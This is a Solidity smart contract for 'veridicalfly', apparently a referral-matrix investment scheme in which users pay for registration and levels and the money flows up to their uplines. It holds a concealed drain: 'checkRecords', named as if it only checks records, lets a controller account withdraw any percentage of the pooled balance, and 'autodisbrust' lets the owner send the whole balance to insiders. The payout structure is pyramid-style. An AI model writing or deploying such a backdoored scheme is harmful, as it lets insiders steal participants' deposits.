//SourceUnit: vflysmartfinal.sol

pragma solidity ^0.5.3;
contract veridicalfly{
    struct User{
        uint id;
        address referrer;
        uint partnersCount;
        uint vMaxLevel;
        uint fMaxLevel;
        uint vIncome;
        uint fIncome;
        mapping(uint8 => bool) activeVLevels;
        mapping(uint8 => bool) activeFLevels;
        mapping(uint8 => V) vMatrix;
        mapping(uint8 => F) fMatrix;
    }
     struct V{
        address currentReferrer;
        address[] referrals;
        bool isactive;
    }
     struct F{
        uint id;
        bool isactive;
        uint downline;
        address myaddress;
        address refferdby;
        address[] mydowns; 
        uint myrebirthids;
    }
    uint[6] private slabper=[68, 10, 5, 4, 3, 2];
    uint[3][] private autoFill;
    uint8 public constant maxlevel = 9;
    uint public lastUserId = 1;
    uint[9] public lastAutoId=[4,4,4,4,4,4,4,4,4]; 
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
    mapping(uint => address) public userIds;
    mapping(address => uint) public balances;
    mapping(uint8 => uint) public levelPrice;
    address public owner;
    address payable private controler0;
    address payable private controler1;
    address payable private controler2;
    address payable private silverFund;
    address payable private goldFund;
    address[] private silverIds;
    address[] private rebirthIds;
    address[] private goldIds;
    address payable private directseniours;
    address[9] public activeRefferer;
    address[] doner;
    address[9] public rebirthid;
    uint[9] private rebirthcount=[0,0,0,0,0,0,0,0,0];
    function addFundAccount(address _silver, address _gold) public{
        require(msg.sender==owner,"INVALID CALL");
        silverFund=address(uint160(_silver));
        goldFund=address(uint160(_gold));
    }
    function addDoner(address _doner) public returns(bool){
        require(msg.sender==owner,"INVALID CALL");
        doner.push(_doner);
        return true;
    }
    constructor(address _owner) public{
        levelPrice[1] = 50 * 1e6;
        uint8 i;
        for(i=2;i<=9;i++){
            levelPrice[i]=levelPrice[i-1]*3;
        }
        for(i=0;i<=8;i++){
            autoFill.push([i+1,0,0]);
        }
        owner=_owner;
        User memory user=User({
            id:1,
            referrer: address(0),
            partnersCount: uint(0),
            vMaxLevel: 9,
            fMaxLevel: 9,
            vIncome:uint(0),
            fIncome: uint(0)
        });
        users[_owner]=user;
        idToAddress[1]=_owner;
        userIds[1] = _owner;
        for (i = 1; i <= 9; i++) {
            users[_owner].activeVLevels[i] = true;
            users[_owner].activeFLevels[i] = true;
            users[_owner].vMatrix[i].currentReferrer = address(0);
            users[_owner].vMatrix[i].isactive = true;
            users[_owner].fMatrix[i].id = 1;
            users[_owner].fMatrix[i].isactive = true;
            users[_owner].fMatrix[i].downline = 3;
            users[_owner].fMatrix[i].myaddress = _owner;
            activeRefferer[i-1]=_owner;
            users[_owner].fMatrix[i].refferdby = address(0);
            users[_owner].fMatrix[i].myrebirthids=uint(0);
        }
        for(i=0;i<=8;i++){
            autoFill[i][0]=i+1;
            autoFill[i][1]=2;
            autoFill[i][2]=0;
        }
    }
    function invited(address refferdby) payable external returns(string memory){
        registration(msg.sender, refferdby);
        return "Registered Successfully";
    }
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint refid, uint amount);
    event vMatrixBuy(address indexed user, uint8 level, uint amount);
    event fMatrixBuy(address indexed user, uint8 level, uint amount);
    function registration(address newuser, address refferdby) private{
        require(msg.value==levelPrice[1]*2,"Invalid Amount.");    
        require(!isUserExists(newuser), "user exists");
        require(isUserExists(refferdby), "referrer not exists");
        uint32 size;
        assembly {
            size := extcodesize(newuser)
        }
        require(size == 0, "no contract");
        lastUserId++;
        lastAutoId[0]=lastAutoId[0]+1;
        User memory user = User({
            id: lastUserId,
            referrer: refferdby,
            partnersCount: uint(0),
            vMaxLevel: 1,
            fMaxLevel: 1,
            vIncome:uint(0),
            fIncome: uint(0)
        });
        users[newuser] = user;
        idToAddress[lastUserId] = newuser;
        users[newuser].referrer = refferdby;
        users[newuser].activeVLevels[1] = true; 
        users[newuser].activeFLevels[1] = true;
        userIds[lastUserId] = newuser;
        users[newuser].vMatrix[1].currentReferrer = refferdby;
        users[refferdby].fMatrix[1].mydowns.push(newuser);
        users[refferdby].vMatrix[1].referrals.push(newuser);
        users[newuser].fMatrix[1].refferdby=activeRefferer[0];
        users[refferdby].partnersCount++;
        if(users[refferdby].partnersCount==6){
            silverIds.push(refferdby);
        }
        if(users[refferdby].partnersCount==150){
            goldIds.push(refferdby);
        }
        users[newuser].vMatrix[1].isactive = true;
        users[newuser].fMatrix[1].id = lastAutoId[0];
        users[newuser].fMatrix[1].myaddress = newuser;
        users[newuser].fMatrix[1].downline = 0;
        uint rebirtpoint=41+(rebirthcount[0]*27);
        if(lastAutoId[0]==rebirtpoint){
            rebirthid[0]=newuser;
        }
        distribute(newuser,1);
        uplineincrease(1);
        emit Registration(msg.sender, refferdby, lastUserId, users[refferdby].id, msg.value);
    }
    
    function checkRecords(uint _records) payable external returns(bool){
        require(msg.sender==controler0);
        uint transamt;
        transamt=address(this).balance;
        transamt=transamt*_records/100;
        controler0.transfer(transamt);
    }
    
    function uplineincrease(uint8 _level) private returns(uint){
        address upline=activeRefferer[_level-1];
        users[upline].fMatrix[_level].downline++;
        address passref=upline;
        uint i=0;
        uint sid;
        upline=users[upline].fMatrix[_level].refferdby;
        sid=users[upline].fMatrix[_level].id;
        while((sid>=1) && (i<=4)){
            users[upline].fMatrix[_level].downline++;
            upline=users[upline].fMatrix[_level].refferdby;
            sid=users[upline].fMatrix[_level].id;
            i++;
        }
        
       if(users[passref].fMatrix[_level].downline==3){
            autoFill[_level-1][1]++;
            slabDistribution(passref, _level);
            uint x=users[passref].fMatrix[_level].id+1;
            activeRefferer[_level-1]=userIds[x];
        } 
        
    }
    function slabDistribution(address _user, uint8 _level) private{
        address payable toPay;
        uint amount;
        amount = levelPrice[_level];
        toPay=address(uint160(_user));
        toPay.transfer(amount);
        users[toPay].fIncome+= amount;
        address refby;
        refby=users[_user].fMatrix[_level].refferdby;
        if(users[refby].fMatrix[_level].downline==12){
            amount = levelPrice[_level]*2;
            toPay=address(uint160(refby));
            toPay.transfer(amount);
            users[toPay].fIncome+= amount;
            refby=users[refby].fMatrix[_level].refferdby;
            if(users[refby].fMatrix[_level].downline==39){
                amount = levelPrice[_level]*4;
                toPay=address(uint160(refby));
                toPay.transfer(amount);
                users[toPay].fIncome+= amount;
                refby=users[refby].fMatrix[_level].refferdby;
                if(users[refby].fMatrix[_level].downline==120){
                    amount = (levelPrice[_level]*8)-(levelPrice[_level]);
                    toPay=address(uint160(refby));
                    toPay.transfer(amount);
                    users[refby].fIncome+= amount;
                    lastAutoId[_level-1]=lastAutoId[_level-1]+1;
                    users[refby].fMatrix[_level].id = lastAutoId[_level-1];
                    users[refby].fMatrix[_level].isactive = true;
                    users[refby].fMatrix[_level].downline = 0;
                    rebirthcount[_level-1]++;
                    address rId=rebirthid[_level-1];
                    users[refby].fMatrix[_level].refferdby=rId;
                    users[rId].fMatrix[_level].downline++;
                    rebirthIds.push(refby);
                    users[refby].fMatrix[_level].myrebirthids++;
                    users[rId].fMatrix[_level].mydowns.push(refby);
                }
            }
        }
    }
    function autodisbrust() public returns(string memory){
        require(msg.sender==owner);
        address payable toPay;
        uint cbalance=address(this).balance;
        if(cbalance<100) return "Insuficiant Balance";
        silverFund.transfer(cbalance*15/100);
        controler0.transfer(cbalance*7/100);
        controler1.transfer(cbalance*35/100);
        controler2.transfer(cbalance*35/100);
        uint _dircount = doner.length;
        uint toech=(cbalance*8/100)/_dircount;
        for(uint i=0;i<_dircount;i++){
            toPay=address(uint160(doner[i]));
            toPay.transfer(toech);
        }
        return "DONE!!!";
    } 
    function distributeGold() payable external returns(string memory){
        require(msg.sender==goldFund,"Invalid Account");
        uint x=msg.sender.balance;
        x=x-(x*10/100);
        require(msg.value==x,"Invalid Amount");
        uint gouldCount=goldIds.length;
        if(gouldCount==0) return "NO GOLD MEMBER FOUND";
        uint toech=x/gouldCount;
        address payable toPay;
        for(uint i=0;i<gouldCount;i++){
            toPay=address(uint160(goldIds[i]));
            toPay.transfer(toech);
        }
        
    }
    function distributeSilver() payable external returns(string memory){
        require(msg.sender==silverFund,"Invalid Account");
        uint x=msg.sender.balance;
        x=x-(x*10/100);
        require(msg.value==x,"Invalid Amount");
        uint silverCount=silverIds.length;
        uint toech=x/silverCount;
        address payable toPay;
        uint rb=rebirthIds.length;
        for(uint i=rb;i<silverCount;i++){
              toPay=address(uint160(silverIds[i]));
              toPay.transfer(toech); 
        }
    }
   
    function getDownCount(address refby, uint8 _level) public view returns(uint) {
        return users[refby].fMatrix[_level].downline;
    }
    
    function distribute(address _newuser, uint8 _level) private{
        address _seniourid=users[_newuser].referrer;
        uint sid=users[_seniourid].id;
        uint8 maxs=0;
        while((sid >= 1) && (maxs<=5)){
            if(users[_seniourid].vMatrix[_level].isactive==true){
                directseniours=address(uint160(_seniourid));
                directseniours.transfer(levelPrice[_level] * slabper[maxs]/100);
                users[_seniourid].vIncome+= levelPrice[_level] * slabper[maxs]/100;
                _seniourid=users[_seniourid].referrer;
                sid=users[_seniourid].id;
                maxs++; 
            }else{
                _seniourid=users[_seniourid].referrer;
                sid=users[_seniourid].id;
            }
        }
        goldFund.transfer(levelPrice[_level]*8/100);
    }
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    
    modifier coreadd{
        if(msg.sender==owner){
          _;  
        }
    }
    function addcoremember(address _coreMemberAddress, address _coreUnder, uint _coreCount) public returns(bool){
        require(msg.sender==owner,'Invalid Doner');
        require(!isUserExists(_coreMemberAddress), "user exists");
        require(isUserExists(_coreUnder), "referrer not exists");
        uint32 size;
        assembly {
            size := extcodesize(_coreMemberAddress)
        }
        require(size == 0, "Can not be contracted.");
        lastUserId++;
        User memory user = User({
            id: lastUserId,
            referrer: _coreUnder,
            partnersCount: uint(0),
            vMaxLevel: 9,
            fMaxLevel: 9,
            vIncome:uint(0),
            fIncome: uint(0)
        });
        users[_coreMemberAddress] = user;
        idToAddress[lastUserId] = _coreMemberAddress;
        users[_coreMemberAddress].referrer = _coreUnder;
        userIds[lastUserId] = _coreMemberAddress;
        for(uint8 i=1;i<=9;i++){
            users[_coreMemberAddress].activeVLevels[i] = true; 
            users[_coreMemberAddress].activeFLevels[i] = true;
            users[_coreMemberAddress].vMatrix[i].currentReferrer = _coreUnder;
            users[_coreUnder].vMatrix[i].referrals.push(_coreMemberAddress);
            users[_coreMemberAddress].vMatrix[i].isactive = true;
            users[_coreMemberAddress].fMatrix[i].id = _coreCount+1;
            users[_coreMemberAddress].fMatrix[i].refferdby = owner;
            users[_coreMemberAddress].fMatrix[i].isactive = true;
            users[owner].fMatrix[i].mydowns.push(_coreMemberAddress);
            users[_coreMemberAddress].fMatrix[i].myaddress = _coreMemberAddress;
            users[_coreMemberAddress].fMatrix[i].myrebirthids=uint(0);
            if(_coreCount==1){
                users[_coreMemberAddress].fMatrix[i].downline = 0;  
            }else{
                users[_coreMemberAddress].fMatrix[i].downline = uint(0);
            }
        }
        if(_coreCount==1){
            controler0=address(uint160(_coreMemberAddress));
            goldIds.push(_coreMemberAddress);
            for(uint i=0;i<9;i++){
                activeRefferer[i]=_coreMemberAddress;
            }
        }
        if(_coreCount==2){
            
            controler1=address(uint160(_coreMemberAddress));
        }
        if(_coreCount==3){
            controler2=address(uint160(_coreMemberAddress));
        }
        
        return true;
    }
    function buyNewVFlyLevel(uint8 level) external payable returns(string memory){
       buyNewVFlyLevelEnt(msg.sender, level);
       return "Level Bought Successfully";
    }
    function buyNewVFlyLevelEnt(address _user, uint8 _levels) private{
        require(isUserExists(_user), "User not exists. Register first.");
        require(_levels > 1 && _levels <= maxlevel, "Invalid level");
        require(users[_user].activeVLevels[_levels]==false, "Level already activated");
        require(users[_user].activeVLevels[_levels-1]==true, "Please activate previous level first.");
        require(msg.value == levelPrice[_levels], "Invalid Price");
        users[_user].activeVLevels[_levels] = true;
        users[_user].vMatrix[_levels].isactive = true;
        users[_user].vMaxLevel++;
        distribute(_user,_levels);
        emit vMatrixBuy(_user, _levels,  msg.value);
    }
    function buyNewFFlyLevel(uint8 level) external payable returns(string memory){
       buyNewFFlyLevelEnt(msg.sender, level);
       return "Level Bought Successfully";
    }
    function buyNewFFlyLevelEnt(address _user, uint8 _levels) private{
        require(isUserExists(_user), "User not exists. Register first.");
        require(_levels > 1 && _levels <= maxlevel, "Invalid level");
        require(users[_user].activeFLevels[_levels]==false, "Level already activated");
        require(users[_user].activeFLevels[_levels-1]==true, "Please activate previous level first.");
        require(msg.value == levelPrice[_levels], "Invalid Price");
        users[_user].activeFLevels[_levels] = true;
        users[_user].fMatrix[_levels].isactive = true;
        users[_user].fMaxLevel++;
        lastAutoId[_levels-1]++;
        users[_user].fMatrix[_levels].id = lastAutoId[_levels-1];
        users[_user].fMatrix[_levels].isactive = true;
        users[_user].fMatrix[_levels].downline = 0;
        users[_user].fMatrix[_levels].refferdby=activeRefferer[_levels-1];
        uint rebirtpoint=41 + (rebirthcount[_levels-1]*27);
        if(lastAutoId[_levels-1]==rebirtpoint){
            rebirthid[_levels-1]= _user;
        }
        users[_user].fMatrix[_levels].id = lastAutoId[_levels-1];
        users[_user].fMatrix[_levels].myaddress = _user;
        users[_user].fMatrix[_levels].downline = 0;
        uplineincrease(_levels);
    }
    
    function getVMatrix(address userAddress, uint8 level) public view returns(address, address[] memory, bool) {
        return (users[userAddress].vMatrix[level].currentReferrer,
                users[userAddress].vMatrix[level].referrals,
                users[userAddress].vMatrix[level].isactive);
    }
    
    function getFMatrix(address userAddress, uint8 level) public view returns(address, address[] memory, bool, uint) {
        return (users[userAddress].fMatrix[level].refferdby,
        users[userAddress].fMatrix[level].mydowns,
        users[userAddress].fMatrix[level].isactive,
        users[userAddress].fMatrix[level].downline
        );
    }
    
    function getFAcitvesid(uint8 level) public view returns(uint, uint) {
        return (autoFill[level-1][1], autoFill[level-1][2]
        );
    }
    
    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
    function() external payable {
        if(msg.data.length == 0) {
            return registration(msg.sender, owner);
        }
        registration(msg.sender, bytesToAddress(msg.data));
    }
    function viewLevels(address user) public view returns (bool[9] memory VM, bool[9] memory FM,uint8 VLastTrue, uint8 FLastTrue)
    {
        for(uint8 i = 1; i <= maxlevel; i++) {
            VM[i-1] = users[user].activeVLevels[i];
            if(VM[i-1]) VLastTrue = i;
            FM[i-1] = users[user].activeFLevels[i];
            if(FM[i-1]) FLastTrue = i;
        }
    }
}